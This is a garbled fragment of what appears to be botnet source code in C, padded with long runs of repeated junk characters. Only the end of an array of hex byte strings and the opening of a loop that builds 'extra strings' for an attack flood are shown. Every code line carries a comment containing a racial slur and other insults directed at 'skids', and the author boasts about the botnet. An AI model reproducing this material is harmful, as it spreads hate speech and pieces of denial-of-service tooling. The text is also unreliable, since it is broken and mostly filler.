UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");// done//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    for (i = 0; i < power; i++) {//extra strings [full on top of the random one incase it gets pacthed for some mad reason]//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
